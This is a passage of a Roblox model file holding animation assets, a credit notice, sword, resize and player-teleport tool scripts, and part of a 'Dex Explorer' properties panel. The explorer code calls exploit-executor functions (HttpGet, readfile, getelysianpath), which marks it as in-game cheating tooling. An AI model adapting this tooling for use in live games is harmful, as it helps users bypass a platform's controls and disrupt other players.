								<double name="Value">9</double>
							</Properties>
						</Item>
					</Item>
					<Item class="Animation" referent="RBX0AD6FF0ECEF44AD781785585CC986086">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750618</url></Content>
							<string name="Name">Animation2</string>
						</Properties>
						<Item class="NumberValue" referent="RBX8DA99989EB1943E09A0DCDCDC39B7AC6">
							<Properties>
								<string name="Name">Weight</string>
								<double name="Value">1</double>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBXB6150405F4A442F0BED0452A850BB35A">
					<Properties>
						<string name="Name">jump</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBX513F2E4AA83F461FB9CCD3E9294C5CA9">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750702</url></Content>
							<string name="Name">JumpAnim</string>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBXFF5B4E7473E646D78DD6CFCA8BAD834A">
					<Properties>
						<string name="Name">run</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBX6EC0058D62FE4CECAFA1983E71FB02C5">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125749145</url></Content>
							<string name="Name">RunAnim</string>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX5C72DA176176479C9CF702973CBB4107">
					<Properties>
						<string name="Name">toolnone</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBXC3F009CE4F3C451692FCA558EB33FDBE">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750867</url></Content>
							<string name="Name">ToolNoneAnim</string>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX864B059764EE48888A26161D57D658C9">
					<Properties>
						<string name="Name">walk</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBXDE166A3F5AB24752AB5E19EF3AC345CD">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125749145</url></Content>
							<string name="Name">WalkAnim</string>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="StringValue" referent="RBX2CEAAB10E60947C2AF7361A4AB53F6A3">
				<Properties>
					<string name="Name">[Credit]</string>
					<string name="Value">Sceleratis | Kohltastrophe [Scripth]</string>
				</Properties>
				<Item class="Script" referent="RBX7D54B5E3EB224DD7B292CD14A053F714">
					<Properties>
						<bool name="Disabled">true</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">READ ME</string>
						<string name="ScriptGuid"></string>
						<ProtectedString name="Source"><![CDATA[--[[
	
	Hello, my name is Sceleratis. The reason I had to add this nasty credit thing is because of
	people, like KohltastropheRBLX, who try to take credit for something they did not make and in the
	process spread false rumors thus bringing the legitimate model's reputation and my personal
	reputation down. So to combat people like this, I have included this credit value.
	
	Under no circumstances do you remove this, or you run the risk of breaking everything.
	
	I am sorry that I have to do this but it was assumed people know better and is ridiculous that
	I need to do this in the first place. Slowly losing faith in humanity.
	
	Aside from just ruining reputations, people who take the script from his models are, at times,
	a couple to even hundreds of versions behind, and the autoupdate cannot function without
	the model in my inventory in the place owner's models due to updates roblox made to the
	insert service a few years ago to try and stop some exploiting.
	
	Who knows, once he reuploads this version this "READ ME" might be removed, because thats just
	what he does.
	
	Scripth is the REAL Kohltastrophe.
	
]]--





]]></ProtectedString>
					</Properties>
				</Item>
			</Item>
			<Item class="LocalScript" referent="RBX2F4DD27D681B43BF977CAF6BCD8261DF">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">SwordScript</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[repeat wait() until game:service('Players').LocalPlayer and game:service('Players').LocalPlayer.Character and game:service('Players').LocalPlayer.Character:findFirstChild("Humanoid")
local Damage = 15
local SlashSound = Instance.new("Sound", script.Parent.Handle)
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Volume = 1
local LungeSound = Instance.new("Sound", script.Parent.Handle)
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Volume = 1
local UnsheathSound = Instance.new("Sound", script.Parent.Handle)
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Volume = 1
local last = 0
script.Parent.Handle.Touched:connect(function(hit)
if hit and hit.Parent and hit.Parent:findFirstChild("Humanoid") and game:service('Players'):findFirstChild(hit.Parent.Name) and game:service('Players').LocalPlayer.Character.Humanoid.Health > 0 and hit.Parent.Humanoid ~= game:service('Players').LocalPlayer.Character.Humanoid then
local tag = Instance.new("ObjectValue", hit.Parent.Humanoid) tag.Value = plr1 tag.Name = "creator" game:service("Debris"):AddItem(tag, 3)
hit.Parent.Humanoid:TakeDamage(Damage)
end
end)
script.Parent.Activated:connect(function()
if not script.Parent.Enabled or game:service('Players').LocalPlayer.Character.Humanoid.Health <= 0 then return end
script.Parent.Enabled = false
local tick = game:service("RunService").Stepped:wait()
if tick - last <= .2 then
LungeSound:play()
local lunge = Instance.new("StringValue", script.Parent) lunge.Name = "toolanim" lunge.Value = "Lunge"
local frc = Instance.new("BodyVelocity", game:service('Players').LocalPlayer.Character.Torso) frc.Name = "SwordForce" frc.velocity = Vector3.new(0,10,0)
wait(.2)
script.Parent.GripForward = Vector3.new(0,0,1)
script.Parent.GripRight = Vector3.new(0,-1,0)
script.Parent.GripUp = Vector3.new(-1,0,0)
wait(.3)
frc:Destroy() wait(.5)
script.Parent.GripForward = Vector3.new(-1,0,0)
script.Parent.GripRight = Vector3.new(0,1,0)
script.Parent.GripUp = Vector3.new(0,0,1)
else
SlashSound:play()
local slash = Instance.new("StringValue", script.Parent) slash.Name = "toolanim" slash.Value = "Slash"
end
last = tick
script.Parent.Enabled = true
end)
script.Parent.Equipped:connect(function(mouse)
for i,v in pairs(game:service('Players').LocalPlayer.Character.Torso:children()) do if v.Name == "SwordForce" then v:Destroy() end end
UnsheathSound:play()
script.Parent.Enabled = true
if not mouse then return end
mouse.Icon = "http://www.mulrbx.com/asset/?id=103593352"
end)]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBXC8B10A47FB98489FBDB4A64E4166CE40">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ClickToTool</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[local target=script:WaitForChild('Target')
local mode=script:WaitForChild('Mode')
local localplayer=game.Players.LocalPlayer
local mouse=localplayer:GetMouse()
local tool=script.Parent
local use=false
local target=game.Players:WaitForChild(target.Value)
local char=target.Character
local hum=char:FindFirstChild('Humanoid')
if not hum then tool:Destroy() end
hum.Died:connect(function() tool:Destroy() end)
tool.Name=mode.Value..target.Name
function onButton1Down(mouse)
	if not target.Character or not target.Character:FindFirstChild('Humanoid') then return end
	if mode.Value=='Teleport' then
		local torso=target.Character:FindFirstChild('Torso')
		if not torso then return end
		local pos=mouse.Hit.p
		torso.CFrame=CFrame.new(Vector3.new(pos.x, pos.y + 4, pos.z))
	elseif mode.Value=='Walk' then
		hum:MoveTo(mouse.Hit.p)
	end
end
local holding=false
function rotate()
	local char=target.Character
	local torso=char:FindFirstChild('Torso')
	if not torso then return end
	holding=true
	print(1)
	repeat
		torso.CFrame=CFrame.new(torso.Position,Vector3.new(mouse.Hit.p.X,torso.Position.Y,mouse.Hit.p.Z))
		wait()
	until not holding or not use
end

mouse.KeyDown:connect(function(key)
	if key:lower()=='r' and use then
		rotate()
	end
	if key:lower()=='x' then
		tool:Destroy()
	end
end)

mouse.KeyUp:connect(function(key)
	if key:lower()=='r' then
		holding=false
	end
end)

function onSelected(mouse)
	use=true
	mouse.Icon = "rbxasset://textures\\ArrowCursor.png"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end
tool.Selected:connect(onSelected)
tool.Deselected:connect(function() use=false holding=false end)]]></ProtectedString>
				</Properties>
				<Item class="StringValue" referent="RBXBF0EB2D9D4A24ABAB9D5FB544F0FF88A">
					<Properties>
						<string name="Name">Target</string>
						<string name="Value"></string>
					</Properties>
				</Item>
				<Item class="StringValue" referent="RBX7BAE7B57F7DB4E08B83F9DC3C938FE5A">
					<Properties>
						<string name="Name">Mode</string>
						<string name="Value"></string>
					</Properties>
				</Item>
			</Item>
			<Item class="LocalScript" referent="RBXCE19E768F9084A0892715EAA8E88803B">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ResizeScript</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[local sb
local hs
local pdist
script.Parent.Selected:connect(function(mouse)
if not mouse then return end
sb = Instance.new("SelectionBox", game:service('Players').LocalPlayer.PlayerGui) sb.Color = BrickColor.new("Bright blue") sb.Adornee = nil
hs = Instance.new("Handles", game:service('Players').LocalPlayer.PlayerGui) hs.Color = BrickColor.new("Bright blue") hs.Adornee = nil
mouse.Button1Down:connect(function() if not mouse.Target or mouse.Target.Locked then sb.Adornee = nil hs.Adornee = nil else sb.Adornee = mouse.Target hs.Adornee = mouse.Target hs.Faces = mouse.Target.ResizeableFaces end end)
hs.MouseDrag:connect(function(old,dist) if hs.Adornee and math.abs(dist-pdist) >= hs.Adornee.ResizeIncrement then if hs.Adornee:Resize(old, math.floor((dist-pdist)/ hs.Adornee.ResizeIncrement + .5) * hs.Adornee.ResizeIncrement) then pdist = dist end end end)
hs.MouseButton1Down:connect(function() pdist = 0 end)
end)
script.Parent.Deselected:connect(function() sb:Destroy() hs:Destroy() end)]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="ScreenGui" referent="RBX5F1BB9B2329A4C829D3F026363F00B58">
				<Properties>
					<int name="DisplayOrder">0</int>
					<bool name="Enabled">true</bool>
					<string name="Name">Dex_Explorer</string>
					<bool name="ResetOnSpawn">true</bool>
				</Properties>
				<Item class="Frame" referent="RBX167233E561E049C7860FEF71BE355D61">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294967295</Color3>
						<float name="BackgroundTransparency">0.100000001</float>
						<Color3 name="BorderColor3">4290756543</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">PropertiesFrame</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0.5</YS>
							<YO>36</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>0.5</YS>
							<YO>-36</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">1</int>
					</Properties>
					<Item class="LocalScript" referent="RBXB7B15B3F38834B4CBAA5399B0FA8EFCD">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Properties</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

wait(0.2)

local print = function(s)
	print(tostring(s))
end

-- Services
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")
local ContentProvider = game:GetService("ContentProvider")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Functions
function httpGet(url)
	return game:HttpGet(url,true)
end

-- RbxApi Stuff

local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
local maxChunkSize = 100 * 1000
local ApiJson
if script:FindFirstChild("RawApiJson") then
	ApiJson = script.RawApiJson
else
	ApiJson = ""
end


function getLocalApiJson()
	local rawApiJson = require(ApiJson)()
	return rawApiJson
end

function getCurrentApiJson()
	local jsonStr = nil
	if readfile and getelysianpath then
		if readfile(getelysianpath().."Xpl0rerApi.txt") then
			print("Api found in folder!")
			jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
			return jsonStr
		end
	end
	local success, err = pcall(function()
		jsonStr = httpGet(apiUrl)
		print("Fetched json successfully")
	end)
	if success then
		print("Returning json")
		--print(jsonStr:sub(1,500))
		return jsonStr
	else
		print("Error fetching json: " .. tostring(err))
		print("Falling back to local copy")
		return getLocalApiJson()
	end
end

function splitStringIntoChunks(jsonStr)
	-- Splits up a string into a table with a given size
	local t = {}
	for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
		local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
		table.insert(t, str)
	end
	return t
end

local jsonToParse = getCurrentApiJson()
local apiChunks = splitStringIntoChunks(jsonToParse)

function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

-- Services
local HttpService = game:GetService("HttpService")
local ServerStorage = game:GetService("ServerStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remotes
--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

-- Functions
local JsonDecode = function(s) return HttpService:JSONDecode(s) end

local function GetApiRemoteFunction(index)
	if (apiChunks[index]) then 
		return apiChunks[index], #apiChunks
	else
		print("Bad index for GetApiJson")
		return nil
	end
end

local function getApiJson()
	local apiTable = {}
	local firstPage, pageCount = GetApiRemoteFunction(1)
	table.insert(apiTable, firstPage)
	for i = 2, pageCount do
		--print("Fetching API page # " .. tostring(i))
		local result = GetApiRemoteFunction(i)
		table.insert(apiTable, result)
	end
	return table.concat(apiTable)
end

local json = getApiJson()
local apiDump =  JsonDecode(json)

local Classes = {}
local Enums = {}

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function isEnum(name)
	return Enums[name] ~= nil
end

local function getProperties(className)
	local class = Classes[className]
	local properties = {}
	
	if not class then return properties end
	
	while class do
		for _,property in pairs(class.Properties) do
			table.insert(properties, property)
		end
		class = Classes[class.Superclass]
	end
	
	sortAlphabetic(properties, "Name")

	return properties
end

for _,item in pairs(apiDump) do
	local itemType = item.type
-- Classes --
	if (itemType == 'Class') then
		Classes[item.Name] = item
		item.Properties = {}
		item.Functions = {}
		item.YieldFunctions = {}
		item.Events = {}
		item.Callbacks = {}
-- Members --
	elseif (itemType == 'Property') then
		table.insert(Classes[item.Class].Properties, item)
	elseif (itemType == 'Function') then
		table.insert(Classes[item.Class].Functions, item)
	elseif (itemType == 'YieldFunction') then
		table.insert(Classes[item.Class].YieldFunctions, item)
	elseif (itemType == 'Event') then
		table.insert(Classes[item.Class].Events, item)
	elseif (itemType == 'Callback') then
		table.insert(Classes[item.Class].Callbacks, item)
-- Enums --
	elseif (itemType == 'Enum') then
		Enums[item.Name] = item
		item.EnumItems = {}
	elseif (itemType == 'EnumItem') then
		Enums[item.Enum].EnumItems[item.Name] = item
	end
end

return {
	Classes = Classes;
	Enums = Enums;
	GetProperties = getProperties;
	IsEnum = isEnum;
}
end

-- Modules
local Permissions = {CanEdit = true}
local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

-- Styles

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local BrickColors = {
	BoxSize = 13;
	BorderSizePixel = 1;
	BorderColor = CreateColor3(160,160,160);
	FrameColor = CreateColor3(160,160,160);
	Size = 20;
	Padding = 4;
	ColorsPerRow = 8;
	OuterBorder = 1;
	OuterBorderColor = Styles.Black;
}

wait(1)

local Gui = script.Parent.Parent
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

local bindGetSelection = ExplorerFrame.GetSelection
local bindSelectionChanged = ExplorerFrame.SelectionChanged
local bindGetApi = PropertiesFrame.GetApi
local bindGetAwait = PropertiesFrame.GetAwaiting
local bindSetAwait = PropertiesFrame.SetAwaiting

local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

local propertiesSearch = PropertiesFrame.Header.TextBox

local AwaitingObjectValue = false
local AwaitingObjectObj
local AwaitingObjectProp

function searchingProperties()
	if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
		return true
	end
	return false
end

local function GetSelection()
	local selection = bindGetSelection:Invoke()
	if #selection == 0 then
		return nil
	else
		return selection
	end 
end

-- Number

local function Round(number, decimalPlaces)
	return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
end

-- Strings

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

-- Data Type Handling

local function ToString(value, type)
	if type == "float" then
		return tostring(Round(value,2))
	elseif type == "Content" then
		if string.find(value,"/asset") then
			local match = string.find(value, "=") + 1
			local id = string.sub(value, match)
			return id
		else
			return tostring(value)
		end
	elseif type == "Vector2" then
		local x = value.x
		local y = value.y
		return string.format("%g, %g", x,y)
	elseif type == "Vector3" then
		local x = value.x
		local y = value.y
		local z = value.z
		return string.format("%g, %g, %g", x,y,z)
	elseif type == "Color3" then
		local r = value.r
		local g = value.g
		local b = value.b
		return string.format("%d, %d, %d", r*255,g*255,b*255)
	elseif type == "UDim2" then
		local xScale = value.X.Scale
		local xOffset = value.X.Offset
		local yScale = value.Y.Scale
		local yOffset = value.Y.Offset
		return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
	else
		return tostring(value)
	end
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		if tonumber(value) ~= nil then
			value = ContentUrl .. value
		end
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	else
		return nil
	end
end


-- Tables

local function CopyTable(T)
  local t2 = {}
  for k,v in pairs(T) do
    t2[k] = v
  end
  return t2
end

local function SortTable(T)
	table.sort(T, 
		function(x,y) return x.Name < y.Name
	end)
end

-- Spritesheet
local Sprite = {
	Width = 13;
	Height = 13;
}

local Spritesheet = {
	Image = "http://www.mulrbx.com/asset/?id=128896947";
	Height = 256;
	Width = 256;
}

local Images = {
	"unchecked",
	"checked",
	"unchecked_over",
	"checked_over",
	"unchecked_disabled",
	"checked_disabled"
}

local function SpritePosition(spriteName)
	local x = 0
	local y = 0
	for i,v in pairs(Images) do
		if (v == spriteName) then
			return {x, y}
		end
		x = x + Sprite.Height
		if (x + Sprite.Width) > Spritesheet.Width then
			x = 0
			y = y + Sprite.Height
		end
	end
end

local function GetCheckboxImageName(checked, readOnly, mouseover)
	if checked then
		if readOnly then
			return "checked_disabled"
		elseif mouseover then
			return "checked_over"
		else
			return "checked"
		end
	else
		if readOnly then
			return "unchecked_disabled"
		elseif mouseover then
			return "unchecked_over"
		else
			return "unchecked"
		end
	end
end

local MAP_ID = 418720155

-- Gui Controls --

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.mulrbx.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

local function CreateCell()
	local tableCell = Instance.new("Frame")
	tableCell.Size = UDim2.new(0.5, -1, 1, 0)
	tableCell.BackgroundColor3 = Row.BackgroundColor
	tableCell.BorderColor3 = Row.BorderColor
	return tableCell
end
	
local function CreateLabel(readOnly)
	local label = Instance.new("TextLabel")
	label.Font = Row.Font
	label.FontSize = Row.FontSize
	label.TextXAlignment = Row.TextXAlignment
	label.BackgroundTransparency = 1
	
	if readOnly then
		label.TextColor3 = Row.TextLockedColor
	else
		label.TextColor3 = Row.TextColor
	end
	return label
end

local function CreateTextButton(readOnly, onClick)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
		button.MouseButton1Click:connect(function()
			onClick()
		end)
	end
	return button
end

local function CreateObject(readOnly)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
	end
	local cancel = Create(Icon('ImageButton',177),{
		Name = "Cancel";
		Visible = false;
		Position = UDim2.new(1,-20,0,0);
		Size = UDim2.new(0,20,0,20);
		Parent = button;
	})
	return button
end

local function CreateTextBox(readOnly)
	if readOnly then
		local box = CreateLabel(readOnly)
		return box
	else
		local box = Instance.new("TextBox")
		if not SettingsRemote:Invoke("ClearProps") then
			box.ClearTextOnFocus = false
		end
		box.Font = Row.Font
		box.FontSize = Row.FontSize
		box.TextXAlignment = Row.TextXAlignment
		box.BackgroundTransparency = 1
		box.TextColor3 = Row.TextColor
		return box
	end
end

local function CreateDropDownItem(text, onClick)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		onClick(text)
	end)	
	return button
end

local function CreateDropDown(choices, currentChoice, readOnly, onClick)
	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	
	local function showArrow(color)
		if arrow then arrow:Destroy() end
		
		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = color;
		})
		local graphicSize = 16/2
		
		arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
		arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
		arrow.Parent = frame
	end
	
	local function hideMenu()
		expanded = false
		showArrow(DropDown.ArrowColor)
		if menu then menu:Destroy() end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
		local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
		if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
			menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateDropDownItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end
	
	showArrow(DropDown.ArrowColor)
	
	if not readOnly then
		
		button.MouseEnter:connect(function()
			button.TextColor3 = Row.TextColor
			showArrow(DropDown.ArrowColorOver)
		end)
		button.MouseLeave:connect(function()
			button.TextColor3 = Row.TextColor
			if not expanded then
				showArrow(DropDown.ArrowColor)
			end
		end)
		button.MouseButton1Click:connect(function()
			if expanded then
				hideMenu()
			else
				showMenu()
			end
		end)
	end
	
	return frame,button
end

local function CreateBrickColor(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorPalette = Instance.new("Frame")
	colorPalette.BackgroundTransparency = 0
	colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
	colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
	colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
	colorPalette.BorderColor3 = BrickColors.BorderColor
	colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
	colorPalette.ZIndex = 5
	colorPalette.Visible = false
	colorPalette.BorderSizePixel = BrickColors.OuterBorder
	colorPalette.BorderColor3 = BrickColors.OuterBorderColor
	colorPalette.Parent = frame
	
	local function show()
		colorPalette.Visible = true
	end
	
	local function hide()
